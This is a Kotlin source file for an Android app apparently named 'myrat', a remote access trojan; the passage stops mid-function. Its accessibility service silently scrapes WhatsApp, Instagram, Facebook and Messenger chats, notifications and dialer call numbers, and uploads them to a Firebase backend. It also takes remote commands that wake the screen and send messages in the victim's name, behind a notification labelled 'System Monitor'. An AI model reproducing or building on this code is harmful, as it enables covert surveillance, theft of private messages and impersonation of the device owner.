package com.myrat.app.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.KeyguardManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.utils.Logger
import kotlinx.coroutines.*
import java.security.MessageDigest
import java.util.concurrent.ConcurrentHashMap

class UnifiedAccessibilityService : AccessibilityService() {

    private val db = FirebaseDatabase.getInstance().reference
    private lateinit var deviceId: String
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val messageCache = ConcurrentHashMap<String, Long>()
    private val contactCache = ConcurrentHashMap<String, Boolean>()
    private val valueEventListener = ConcurrentHashMap<String, ValueEventListener>()
    private val CACHE_DURATION = 24 * 60 * 60 * 1000L // 24 hours
    private val NOTIFICATION_ID = 15
    private val CHANNEL_ID = "UnifiedAccessibilityService"
    private var wakeLock: PowerManager.WakeLock? = null
    private var screenWakeLock: PowerManager.WakeLock? = null
    private val handler = Handler(Looper.getMainLooper())
    private var lastNotificationTime = 0L
    private val pendingWhatsAppCommands = mutableListOf<WhatsAppCommand>()
    private val pendingSocialCommands = mutableListOf<SocialCommand>()
    private var isProcessingCommand = false

    companion object {
        // WhatsApp packages
        const val WHATSAPP_PACKAGE = "com.whatsapp"
        const val WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b"

        // Social Media packages
        const val INSTAGRAM_PACKAGE = "com.instagram.android"
        const val FACEBOOK_PACKAGE = "com.facebook.katana"
        const val MESSENGER_PACKAGE = "com.facebook.orca"
        const val FACEBOOK_LITE_PACKAGE = "com.facebook.lite"

        // Dialer packages
        private val DIALER_PACKAGES = setOf(
            "com.android.dialer",
            "com.google.android.dialer",
            "com.samsung.android.dialer",
            "com.miui.dialer",
            "com.huawei.contacts",
            "com.oneplus.dialer",
            "com.oppo.dialer",
            "com.vivo.dialer",
            "com.realme.dialer"
        )

        // All monitored packages
        private val ALL_PACKAGES = setOf(
            WHATSAPP_PACKAGE,
            WHATSAPP_BUSINESS_PACKAGE,
            INSTAGRAM_PACKAGE,
            FACEBOOK_PACKAGE,
            MESSENGER_PACKAGE,
            FACEBOOK_LITE_PACKAGE
        ) + DIALER_PACKAGES

        // Enhanced view IDs for better compatibility
        private val MESSAGE_TEXT_IDS = listOf(
            "message_text", "text_message", "message_body", "chat_message_text", "message_content",
            "row_thread_item_text_send", "row_thread_item_text_recv", "message_text_view",
            "direct_text_message_text_view", "text_view", "message_bubble_text"
        )
        
        private val CONVERSATION_LAYOUT_IDS = listOf(
            "conversation_layout", "chat_layout", "conversation_container", "chat_container",
            "thread_view", "direct_thread_view", "message_list", "chat_messages_container"
        )
        
        private val CONVERSATIONS_ROW_IDS = listOf(
            "conversations_row", "chat_row", "conversation_item", "chat_item",
            "thread_list_item", "direct_inbox_row", "inbox_item"
        )
        
        private val DATE_IDS = listOf(
            "date", "time", "timestamp", "message_time", "message_timestamp",
            "message_timestamp_text", "time_text"
        )
        
        private val CONTACT_NAME_IDS = listOf(
            "conversation_contact_name", "contact_name", "chat_title", "header_title", "toolbar_title",
            "thread_title", "direct_thread_title", "username", "display_name"
        )
        
        private val SEARCH_IDS = listOf(
            "menuitem_search", "search", "search_button", "action_search",
            "search_edit_text", "search_bar"
        )
        
        private val SEARCH_INPUT_IDS = listOf(
            "search_input", "search_field", "search_edit_text", "search_src_text",
            "search_box", "query_text"
        )
        
        private val MESSAGE_ENTRY_IDS = listOf(
            "entry", "message_entry", "input_message", "chat_input", "compose_text",
            "message_composer", "text_input", "compose_text_view", "message_edit_text"
        )
        
        private val SEND_IDS = listOf(
            "send", "send_button", "btn_send", "send_message_button",
            "composer_send_button", "send_icon"
        )

        // Call-related IDs
        private val CALL_NUMBER_IDS = listOf(
            "digits", "number", "phone_number", "call_number", "contact_name",
            "caller_name", "incoming_number", "outgoing_number"
        )

        private val CALL_STATE_TEXTS = listOf(
            "calling", "dialing", "ringing", "connected", "ended", "busy",
            "incoming call", "outgoing call", "call ended"
        )
    }

    data class WhatsAppCommand(
        val number: String,
        val message: String,
        val packageName: String,
        val timestamp: Long = System.currentTimeMillis(),
        val retryCount: Int = 0
    )

    data class SocialCommand(
        val username: String,
        val message: String,
        val packageName: String,
        val timestamp: Long = System.currentTimeMillis(),
        val retryCount: Int = 0
    )

    override fun onCreate() {
        super.onCreate()
        try {
            acquireWakeLocks()
            deviceId = MainActivity.getDeviceId(this)
            Logger.log("UnifiedAccessibilityService started for deviceId: $deviceId")
            startForegroundService()
            setupAccessibilityService()
            loadKnownContacts()
            scheduleCacheCleanup()
            listenForCommands()
            setupCommandProcessor()
        } catch (e: Exception) {
            Logger.error("Failed to create UnifiedAccessibilityService", e)
        }
    }

    private fun acquireWakeLocks() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager

            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "UnifiedAccessibilityService:KeepAlive"
            )
            wakeLock?.acquire(60 * 60 * 1000L) // 1 hour

            screenWakeLock = powerManager.newWakeLock(
                PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                "UnifiedAccessibilityService:ScreenWake"
            )

            Logger.log("Wake locks acquired for UnifiedAccessibilityService")
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake locks", e)
        }
    }

    private fun startForegroundService() {
        try {
            val channelName = "Unified Accessibility Service"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_LOW
                ).apply {
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                }
                (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                    .createNotificationChannel(channel)
            }

            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Monitor")
                .setContentText("Monitoring WhatsApp, Social Media, and Calls")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setSilent(true)
                .setShowWhen(false)
                .setOngoing(true)
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .build()

            startForeground(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            Logger.error("Failed to start foreground service", e)
        }
    }

    private fun setupAccessibilityService() {
        try {
            val info = AccessibilityServiceInfo().apply {
                eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                        AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_CLICKED or
                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
                        AccessibilityEvent.TYPE_VIEW_SELECTED

                feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                        AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY

                packageNames = ALL_PACKAGES.toTypedArray()
                notificationTimeout = 50
            }
            serviceInfo = info
            Logger.log("Unified accessibility service configured for comprehensive monitoring")
        } catch (e: Exception) {
            Logger.error("Failed to setup accessibility service", e)
        }
    }

    private fun setupCommandProcessor() {
        scope.launch {
            while (isActive) {
                try {
                    delay(1000) // Check every second for commands

                    if (!isProcessingCommand) {
                        when {
                            pendingWhatsAppCommands.isNotEmpty() -> processNextWhatsAppCommand()
                            pendingSocialCommands.isNotEmpty() -> processNextSocialCommand()
                        }
                    }

                } catch (e: Exception) {
                    Logger.error("Error in command processor", e)
                }
            }
        }
    }

    private suspend fun processNextWhatsAppCommand() {
        if (isProcessingCommand || pendingWhatsAppCommands.isEmpty()) return

        isProcessingCommand = true
        try {
            val command = pendingWhatsAppCommands.removeAt(0)
            Logger.log("Processing WhatsApp command: ${command.number} - ${command.message}")

            wakeUpScreen()
            sendWhatsAppMessage(command.number, command.message, command.packageName)

            delay(2000) // Wait between commands
        } catch (e: Exception) {
            Logger.error("Error processing WhatsApp command", e)
        } finally {
            isProcessingCommand = false
        }
    }

    private suspend fun processNextSocialCommand() {
        if (isProcessingCommand || pendingSocialCommands.isEmpty()) return

        isProcessingCommand = true
        try {
            val command = pendingSocialCommands.removeAt(0)
            Logger.log("Processing social media command: ${command.username} - ${command.message}")

            wakeUpScreen()
            sendSocialMediaMessage(command.username, command.message, command.packageName)

            delay(2000) // Wait between commands
        } catch (e: Exception) {
            Logger.error("Error processing social command", e)
        } finally {
            isProcessingCommand = false
        }
    }

    private fun wakeUpScreen() {
        try {
            val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager

            if (!powerManager.isInteractive || keyguardManager.isKeyguardLocked) {
                Logger.log("Waking up screen for interaction")

                screenWakeLock?.let { wakeLock ->
                    if (!wakeLock.isHeld) {
                        wakeLock.acquire(30000) // 30 seconds
                        Logger.log("Screen wake lock acquired")
                    }
                }

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                    try {
                        val intent = Intent(Intent.ACTION_MAIN).apply {
                            addCategory(Intent.CATEGORY_HOME)
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        startActivity(intent)
                    } catch (e: Exception) {
                        Logger.error("Failed to wake screen with intent", e)
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Error waking up screen", e)
        }
    }

    private fun scheduleCacheCleanup() {
        scope.launch {
            try {
                while (isActive) {
                    delay(60_000)
                    val now = System.currentTimeMillis()
                    val removedEntries = messageCache.entries.filter { now - it.value > CACHE_DURATION }
                    removedEntries.forEach { messageCache.remove(it.key) }
                    if (removedEntries.isNotEmpty()) {
                        Logger.log("Cache cleaned, removed ${removedEntries.size} entries, size: ${messageCache.size}")
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error in cache cleanup", e)
            }
        }
    }

    private fun loadKnownContacts() {
        try {
            // Load WhatsApp contacts
            db.child("Device").child(deviceId).child("whatsapp/contacts")
                .get().addOnSuccessListener { snapshot ->
                    snapshot.children.forEach { contact ->
                        contactCache[contact.key!!] = true
                    }
                    Logger.log("Loaded ${contactCache.size} known WhatsApp contacts")
                }.addOnFailureListener { e ->
                    Logger.log("Failed to load WhatsApp contacts: ${e.message}")
                }

            // Load social media contacts
            db.child("Device").child(deviceId).child("social_media/contacts")
                .get().addOnSuccessListener { snapshot ->
                    snapshot.children.forEach { contact ->
                        contactCache[contact.key!!] = true
                    }
                    Logger.log("Loaded social media contacts")
                }.addOnFailureListener { e ->
                    Logger.log("Failed to load social media contacts: ${e.message}")
                }
        } catch (e: Exception) {
            Logger.error("Error loading known contacts", e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        val packageName = event.packageName?.toString() ?: return
        if (packageName !in ALL_PACKAGES) return

        scope.launch {
            try {
                when (packageName) {
                    WHATSAPP_PACKAGE, WHATSAPP_BUSINESS_PACKAGE -> {
                        handleWhatsAppEvent(event, packageName)
                    }
                    INSTAGRAM_PACKAGE, FACEBOOK_PACKAGE, MESSENGER_PACKAGE, FACEBOOK_LITE_PACKAGE -> {
                        handleSocialMediaEvent(event, packageName)
                    }
                    in DIALER_PACKAGES -> {
                        handleDialerEvent(event, packageName)
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error processing accessibility event: ${e.message}", e)
            }
        }
    }

    private fun handleWhatsAppEvent(event: AccessibilityEvent, packageName: String) {
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    handleWhatsAppContentChange(event, packageName)
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    handleWhatsAppWindowStateChange(event, packageName)
                }
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                    handleWhatsAppNotificationChange(event, packageName)
                }
            }
        } catch (e: Exception) {
            Logger.error("Error handling WhatsApp event", e)
        }
    }

    private fun handleSocialMediaEvent(event: AccessibilityEvent, packageName: String) {
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    handleSocialMediaContentChange(event, packageName)
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    handleSocialMediaWindowStateChange(event, packageName)
                }
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                    handleSocialMediaNotificationChange(event, packageName)
                }
            }
        } catch (e: Exception) {
            Logger.error("Error handling social media event", e)
        }
    }

    private fun handleDialerEvent(event: AccessibilityEvent, packageName: String) {
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    handleDialerContentChange(event, packageName)
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    handleDialerWindowStateChange(event, packageName)
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    handleDialerViewClick(event, packageName)
                }
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                    handleDialerNotificationChange(event, packageName)
                }
            }
        } catch (e: Exception) {
            Logger.error("Error handling dialer event", e)
        }
    }

    // WhatsApp Event Handlers
    private fun handleWhatsAppContentChange(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return

            if (isChatScreen(rootNode, packageName)) {
                val messageNodes = findMessageNodes(rootNode, packageName)
                messageNodes.forEach { node ->
                    extractAndUploadWhatsAppMessage(node, packageName)
                }
                extractChatMetadata(rootNode, packageName, "whatsapp")
            }
        } catch (e: Exception) {
            Logger.error("Error handling WhatsApp content change", e)
        }
    }

    private fun handleWhatsAppWindowStateChange(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return

            if (isChatListScreen(rootNode, packageName)) {
                extractWhatsAppChatListData(rootNode, packageName)
            } else if (isChatScreen(rootNode, packageName)) {
                extractChatMetadata(rootNode, packageName, "whatsapp")
            }
        } catch (e: Exception) {
            Logger.error("Error handling WhatsApp window state change", e)
        }
    }

    private fun handleWhatsAppNotificationChange(event: AccessibilityEvent, packageName: String) {
        try {
            val notificationText = event.text?.joinToString(" ") ?: return
            if (notificationText.isBlank()) return

            val timestamp = System.currentTimeMillis()
            val parts = notificationText.split(":", limit = 2)
            if (parts.size >= 2) {
                val sender = parts[0].trim()
                val message = parts[1].trim()

                if (sender.isNotEmpty() && message.isNotEmpty()) {
                    val messageId = generateMessageId(sender, message, timestamp, packageName, "Received")

                    if (!messageCache.containsKey(messageId)) {
                        messageCache[messageId] = timestamp

                        val isNewContact = !contactCache.containsKey(sender)
                        if (isNewContact) {
                            contactCache[sender] = true
                        }

                        val messageData = mapOf(
                            "sender" to sender,
                            "recipient" to "You",
                            "content" to message,
                            "timestamp" to timestamp,
                            "type" to "Received",
                            "isNewContact" to isNewContact,
                            "uploaded" to System.currentTimeMillis(),
                            "messageId" to messageId,
                            "packageName" to packageName,
                            "direction" to "Received",
                            "source" to "notification"
                        )

                        Logger.log("New WhatsApp message from notification: $sender -> $message")
                        uploadWhatsAppMessage(messageData)
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Error handling WhatsApp notification change", e)
        }
    }

    // Social Media Event Handlers
    private fun handleSocialMediaContentChange(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return

            if (isChatScreen(rootNode, packageName)) {
                val messageNodes = findMessageNodes(rootNode, packageName)
                messageNodes.forEach { node ->
                    extractAndUploadSocialMediaMessage(node, packageName)
                }
                extractChatMetadata(rootNode, packageName, "social_media")
            }
        } catch (e: Exception) {
            Logger.error("Error handling social media content change", e)
        }
    }

    private fun handleSocialMediaWindowStateChange(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return

            if (isChatListScreen(rootNode, packageName)) {
                extractSocialMediaChatListData(rootNode, packageName)
            } else if (isChatScreen(rootNode, packageName)) {
                extractChatMetadata(rootNode, packageName, "social_media")
            }
        } catch (e: Exception) {
            Logger.error("Error handling social media window state change", e)
        }
    }

    private fun handleSocialMediaNotificationChange(event: AccessibilityEvent, packageName: String) {
        try {
            val notificationText = event.text?.joinToString(" ") ?: return
            if (notificationText.isBlank()) return

            val timestamp = System.currentTimeMillis()
            val parts = notificationText.split(":", limit = 2)
            if (parts.size >= 2) {
                val sender = parts[0].trim()
                val message = parts[1].trim()

                if (sender.isNotEmpty() && message.isNotEmpty()) {
                    val messageId = generateMessageId(sender, message, timestamp, packageName, "Received")

                    if (!messageCache.containsKey(messageId)) {
                        messageCache[messageId] = timestamp

                        val isNewContact = !contactCache.containsKey(sender)
                        if (isNewContact) {
                            contactCache[sender] = true
                        }

                        val messageData = mapOf(
                            "sender" to sender,
                            "recipient" to "You",
                            "content" to message,
                            "timestamp" to timestamp,
                            "type" to "Received",
                            "isNewContact" to isNewContact,
                            "uploaded" to System.currentTimeMillis(),
                            "messageId" to messageId,
                            "packageName" to packageName,
                            "platform" to getPlatformName(packageName),
                            "direction" to "Received",
                            "source" to "notification"
                        )

                        Logger.log("New social media message from notification: $sender -> $message (${getPlatformName(packageName)})")
                        uploadSocialMediaMessage(messageData)
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Error handling social media notification change", e)
        }
    }

    // Dialer Event Handlers
    private fun handleDialerContentChange(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return

            if (isDialerCallScreen(rootNode, packageName)) {
                val messageNodes = findCallNodes(rootNode, packageName)
                messageNodes.forEach { node ->
                    extractAndUploadCallInfo(node, packageName)
                }
                extractCallMetadata(rootNode, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling dialer content change", e)
        }
    }

    private fun handleDialerWindowStateChange(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return
            val className = event.className?.toString() ?: return
            Logger.log("Dialer window state changed in $packageName: $className")

            val isCallScreen = className.contains("call", ignoreCase = true) ||
                    className.contains("incall", ignoreCase = true) ||
                    className.contains("dialer", ignoreCase = true)

            if (isCallScreen) {
                extractCallInformation(rootNode, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling dialer window state change", e)
        }
    }

    private fun handleDialerViewClick(event: AccessibilityEvent, packageName: String) {
        try {
            val text = event.text?.joinToString(" ") ?: return
            Logger.log("Dialer view clicked in $packageName: $text")

            val lowerText = text.lowercase()
            if (lowerText.contains("call") || lowerText.contains("dial")) {
                val rootNode = rootInActiveWindow ?: return
                extractCallInformation(rootNode, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling dialer view click", e)
        }
    }

    private fun handleDialerNotificationChange(event: AccessibilityEvent, packageName: String) {
        try {
            val text = event.text?.joinToString(" ") ?: return
            Logger.log("Dialer notification in $packageName: $text")

            val phoneNumber = extractPhoneNumber(text)
            if (phoneNumber != null) {
                reportCallNumber(phoneNumber, "notification_$packageName")
            }
        } catch (e: Exception) {
            Logger.error("Error handling dialer notification change", e)
        }
    }

    // Helper Methods
    private fun isChatScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            CONVERSATION_LAYOUT_IDS.any { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            Logger.error("Error checking if chat screen", e)
            false
        }
    }

    private fun isChatListScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            CONVERSATIONS_ROW_IDS.any { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            Logger.error("Error checking if chat list screen", e)
            false
        }
    }

    private fun isDialerCallScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            CALL_NUMBER_IDS.any { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun findMessageNodes(rootNode: AccessibilityNodeInfo, packageName: String): List<AccessibilityNodeInfo> {
        return try {
            MESSAGE_TEXT_IDS.flatMap { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
            }
        } catch (e: Exception) {
            Logger.error("Error finding message nodes", e)
            emptyList()
        }
    }

    private fun findCallNodes(rootNode: AccessibilityNodeInfo, packageName: String): List<AccessibilityNodeInfo> {
        return try {
            CALL_NUMBER_IDS.flatMap { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
            }
        } catch (e: Exception) {
            Logger.error("Error finding call nodes", e)
            emptyList()
        }
    }

    // Message extraction and upload methods
    private fun extractAndUploadWhatsAppMessage(node: AccessibilityNodeInfo, packageName: String) {
        try {
            val messageText = node.text?.toString() ?: return
            if (messageText.isBlank()) return

            val parent = node.parent ?: return
            val timestamp = getTimestampFromNode(parent, packageName) ?: System.currentTimeMillis()

            val direction = if (isOutgoingMessage(parent, packageName)) "Sent" else "Received"
            val chatName = getCurrentChatName(packageName) ?: "Unknown"

            val isNewContact = !contactCache.containsKey(chatName) && direction == "Received"
            if (isNewContact) {
                contactCache[chatName] = true
                db.child("Device").child(deviceId).child("whatsapp/contacts").child(chatName)
                    .setValue(mapOf(
                        "dpUrl" to getContactDp(chatName, packageName),
                        "firstSeen" to System.currentTimeMillis()
                    ))
            }

            val messageId = generateMessageId(chatName, messageText, timestamp, packageName, direction)
            if (messageCache.containsKey(messageId)) {
                return
            }
            messageCache[messageId] = timestamp

            val messageData = mapOf(
                "sender" to (if (direction == "Sent") "You" else chatName),
                "recipient" to (if (direction == "Sent") chatName else "You"),
                "content" to messageText,
                "timestamp" to timestamp,
                "type" to if (isReplyMessage(parent, packageName)) "Reply" else direction,
                "isNewContact" to isNewContact,
                "uploaded" to System.currentTimeMillis(),
                "messageId" to messageId,
                "packageName" to packageName,
                "direction" to direction,
                "source" to "accessibility"
            )

            Logger.log("New WhatsApp message: ${messageData["type"]} from ${messageData["sender"]} ($packageName)")
            uploadWhatsAppMessage(messageData)
        } catch (e: Exception) {
            Logger.error("Error extracting and uploading WhatsApp message", e)
        }
    }

    private fun extractAndUploadSocialMediaMessage(node: AccessibilityNodeInfo, packageName: String) {
        try {
            val messageText = node.text?.toString() ?: return
            if (messageText.isBlank()) return

            val parent = node.parent ?: return
            val timestamp = getTimestampFromNode(parent, packageName) ?: System.currentTimeMillis()

            val direction = if (isOutgoingMessage(parent, packageName)) "Sent" else "Received"
            val chatName = getCurrentChatName(packageName) ?: "Unknown"

            val isNewContact = !contactCache.containsKey(chatName) && direction == "Received"
            if (isNewContact) {
                contactCache[chatName] = true
                db.child("Device").child(deviceId).child("social_media/contacts").child(chatName)
                    .setValue(mapOf(
                        "profileUrl" to getContactProfile(chatName, packageName),
                        "platform" to getPlatformName(packageName),
                        "firstSeen" to System.currentTimeMillis()
                    ))
            }

            val messageId = generateMessageId(chatName, messageText, timestamp, packageName, direction)
            if (messageCache.containsKey(messageId)) {
                return
            }
            messageCache[messageId] = timestamp

            val messageData = mapOf(
                "sender" to (if (direction == "Sent") "You" else chatName),
                "recipient" to (if (direction == "Sent") chatName else "You"),
                "content" to messageText,
                "timestamp" to timestamp,
                "type" to if (isReplyMessage(parent, packageName)) "Reply" else direction,
                "isNewContact" to isNewContact,
                "uploaded" to System.currentTimeMillis(),
                "messageId" to messageId,
                "packageName" to packageName,
                "platform" to getPlatformName(packageName),
                "direction" to direction,
                "source" to "accessibility"
            )

            Logger.log("New social media message: ${messageData["type"]} from ${messageData["sender"]} (${getPlatformName(packageName)})")
            uploadSocialMediaMessage(messageData)
        } catch (e: Exception) {
            Logger.error("Error extracting and uploading social media message", e)
        }
    }

    private fun extractAndUploadCallInfo(node: AccessibilityNodeInfo, packageName: String) {
        try {
            val callText = node.text?.toString() ?: return
            if (callText.isBlank()) return

            val phoneNumber = extractPhoneNumber(callText)
            if (phoneNumber != null) {
                reportCallNumber(phoneNumber, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error extracting and uploading call info", e)
        }
    }

    // Command listening and processing
    private fun listenForCommands() {
        try {
            // Listen for WhatsApp commands
            val whatsappSendRef = db.child("Device").child(deviceId).child("whatsapp/commands")
            val whatsappListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { command ->
                            val number = command.child("number").getValue(String::class.java) ?: return@forEach
                            val message = command.child("message").getValue(String::class.java) ?: return@forEach
                            val packageName = command.child("packageName").getValue(String::class.java) ?: WHATSAPP_PACKAGE

                            Logger.log("Received WhatsApp send command for $number: $message ($packageName)")

                            pendingWhatsAppCommands.add(WhatsAppCommand(number, message, packageName))
                            command.ref.removeValue()
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing WhatsApp send commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Failed to read WhatsApp send command: ${error.message}")
                }
            }
            valueEventListener["whatsappSendCommands"] = whatsappListener
            whatsappSendRef.addValueEventListener(whatsappListener)

            // Listen for Social Media commands
            val socialSendRef = db.child("Device").child(deviceId).child("social_media/commands")
            val socialListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { command ->
                            val username = command.child("username").getValue(String::class.java) ?: return@forEach
                            val message = command.child("message").getValue(String::class.java) ?: return@forEach
                            val packageName = command.child("packageName").getValue(String::class.java) ?: INSTAGRAM_PACKAGE

                            Logger.log("Received social media send command for $username: $message (${getPlatformName(packageName)})")

                            pendingSocialCommands.add(SocialCommand(username, message, packageName))
                            command.ref.removeValue()
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing social media send commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Failed to read social media send command: ${error.message}")
                }
            }
            valueEventListener["socialSendCommands"] = socialListener
            socialSendRef.addValueEventListener(socialListener)
        } catch (e: Exception) {
            Logger.error("Error setting up command listeners", e)
        }
    }

    // Message sending methods
    private suspend fun sendWhatsAppMessage(recipient: String, message: String, packageName: String) {
        try {
            Logger.log("🚀 Starting to send WhatsApp message to $recipient via $packageName")

            wakeUpScreen()
            delay(1000)

            val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            } ?: run {
                Logger.error("$packageName not installed")
                return
            }

            startActivity(intent)
            delay(4000)

            // Navigate and send message using the existing WhatsApp logic
            if (navigateToWhatsAppSearch(packageName) &&
                searchForWhatsAppRecipient(recipient, packageName) &&
                sendWhatsAppMessageToRecipient(message, packageName)) {
                
                Logger.log("🎉 Successfully sent WhatsApp message to $recipient ($packageName)")
                
                val messageData = mapOf(
                    "sender" to "You",
                    "recipient" to recipient,
                    "content" to message,
                    "timestamp" to System.currentTimeMillis(),
                    "type" to "Sent",
                    "isNewContact" to !contactCache.containsKey(recipient),
                    "uploaded" to System.currentTimeMillis(),
                    "messageId" to generateMessageId("You", message, System.currentTimeMillis(), packageName, "Sent"),
                    "packageName" to packageName,
                    "direction" to "Sent",
                    "source" to "command"
                )
                uploadWhatsAppMessage(messageData)
            }

            screenWakeLock?.let { wakeLock ->
                if (wakeLock.isHeld) {
                    wakeLock.release()
                    Logger.log("Screen wake lock released after sending")
                }
            }

        } catch (e: Exception) {
            Logger.error("Error sending WhatsApp message ($packageName): ${e.message}", e)
            screenWakeLock?.let { wakeLock ->
                if (wakeLock.isHeld) {
                    wakeLock.release()
                }
            }
        }
    }

    private suspend fun sendSocialMediaMessage(recipient: String, message: String, packageName: String) {
        try {
            Logger.log("🚀 Starting to send social media message to $recipient via ${getPlatformName(packageName)}")

            wakeUpScreen()
            delay(1000)

            val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            } ?: run {
                Logger.error("${getPlatformName(packageName)} not installed")
                return
            }

            startActivity(intent)
            delay(4000)

            // Navigate and send message using social media logic
            if (navigateToSocialMediaMessages(packageName) &&
                searchForSocialMediaRecipient(recipient, packageName) &&
                sendSocialMediaMessageToRecipient(message, packageName)) {
                
                Logger.log("🎉 Successfully sent social media message to $recipient (${getPlatformName(packageName)})")
                
                val messageData = mapOf(
                    "sender" to "You",
                    "recipient" to recipient,
                    "content" to message,
                    "timestamp" to System.currentTimeMillis(),
                    "type" to "Sent",
                    "isNewContact" to !contactCache.containsKey(recipient),
                    "uploaded" to System.currentTimeMillis(),
                    "messageId" to generateMessageId("You", message, System.currentTimeMillis(), packageName, "Sent"),
                    "packageName" to packageName,
                    "platform" to getPlatformName(packageName),
                    "direction" to "Sent",
                    "source" to "command"
                )
